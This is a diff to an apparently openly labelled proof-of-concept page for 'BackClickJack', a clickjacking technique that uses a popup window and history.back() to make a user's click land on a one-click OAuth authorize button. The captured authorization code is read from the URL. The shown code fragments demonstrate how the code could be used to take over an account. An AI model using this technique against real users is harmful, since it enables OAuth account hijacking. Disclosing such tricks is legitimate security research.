@@ -17,7 +17,7 @@ function attack(){
 
 if(location.href.indexOf('code=') != -1){
   code = location.href.substring(location.href.indexOf('code='));
-  alert("Now we have "+code+" that we can use to get access_token and access your account.")
+  alert("Now we have "+code+" that we can use to get access_token and access your account. By the way, audit your https://github.com/settings/applications")
 }
 
 </script>
@@ -25,7 +25,7 @@ if(location.href.indexOf('code=') != -1){
 
 <p>BackClickJack is a simple trick based on opening a window with your Target URL, then navigating to your Game URL, that somehow tricks user into clicking in certain location. Then onmouseover we do w.history.back() and the click lands inside the Target URL.</p>
 
-<p>Using popunder system would make it look more trustworthy, </p>
+<p>Now it autofocuses on the new window and waits for Target URL to load. However using popunder system we can do the loading in background. It's just a PoC.</p>
 
 <p>Target URL (usually one-click OAuth is best target)</p>
 
